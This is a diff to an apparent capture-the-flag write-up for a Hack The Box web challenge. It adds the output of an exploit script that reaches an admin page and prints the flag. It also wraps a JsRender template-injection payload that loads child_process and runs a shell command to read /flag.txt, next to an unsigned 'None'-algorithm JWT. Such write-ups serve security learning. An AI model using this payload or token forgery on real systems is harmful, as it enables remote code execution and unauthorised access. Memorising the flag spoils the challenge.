@@ -87,7 +87,9 @@ register = {
 
 # https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/README.md#jsrender-nodejs
 register_ssti = {
+{% raw %}
     'username': "{{:\"pwnd\".toString.constructor.call({},\"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()\")()}}",
+{% endraw %}
     'password': 'aaa'
 }
 
@@ -116,4 +118,20 @@ print(response.text)
 # Admin
 response = s.get(endpoint + '/admin')
 print(response.text)
+```
+
+And the output:
+```bash
+$ python lol.py
+{"message":"User registered succesfully"}
+{"message":"Logged in successfully"}
+eyJhbGciOiAiTm9uZSIsICJ0eXAiOiAiSldUIn0.eyJpZCI6IDEsICJpYXQiOiAxNjc5NzI5ODM1LCAiZXhwIjogMTY3OTczMzQzNX0.
+{"message":"User registered succesfully"}
+<!DOCTYPE html>
+<html lang="en">
+[...]
+<body>
+[...]
+<li class="list-group-item d-flex justify-content-between align-items-center ">
+          <span>HTB{Pr3_C0MP111N6_W17H0U7_P4DD13804rD1N6_5K1115}
 ```
